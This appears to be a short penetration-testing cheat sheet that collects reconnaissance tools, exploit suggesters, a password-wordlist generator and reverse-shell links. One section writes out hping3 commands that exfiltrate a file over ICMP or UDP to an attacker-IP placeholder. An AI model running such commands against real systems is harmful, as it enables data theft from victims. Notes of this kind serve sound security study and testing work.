## OWASP Amass
Tool used for DNS enumeration

https://github.com/OWASP/Amass
```
sudo docker run amass enum -d example.com -ip -src -brute -include-unresolvable
```

## OWASP Security khowledge Framework
SKF is a fully open-source Python-Flask web-application that uses the OWASP Application Security Verification Standard to train you and your team in writing secure code, by design.

https://securityknowledgeframework.org/demo.php


## Send file through hping3 (Data leak)
1- check the file size using `ls -la`

2.a - To send the file as an **icmp** using hping3 command

`sudo hping3 ATTCKERIP --icmp -d FILESIZE -c 1 --file FILENAME`

2.b - To send the file as a **UDP** using hping3 command

`sudo hping3 ATTCKERIP --udp -d FILESIZE -c 1 --file FILENAME`

3 - (Optional) On the attacker machine you might disable replying icmp using iptables

**NOTE: This attack is simply detected using IDS/IPS**

## Suggester:
A simple code for Checking your local host system for available exploites

#### Linux suggester: https://github.com/mzet-/linux-exploit-suggester

#### windows suggester: https://github.com/GDSSecurity/Windows-Exploit-Suggester

## Custome Word list Generator
CeWL is a ruby app which spiders a given URL to a specified depth, optionally following external links, and
returns a list of words which can then be used for password crackers such as John the Ripper.
https://github.com/digininja/CeWL


## Spawn tty shell

If you are a normal user with root privilage to any of these commands, you can have root privilage using the commands
below
https://netsec.ws/?p=337


## Reverse shell

Getting a Reverse shell through a vulnerability found in the victim machine

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

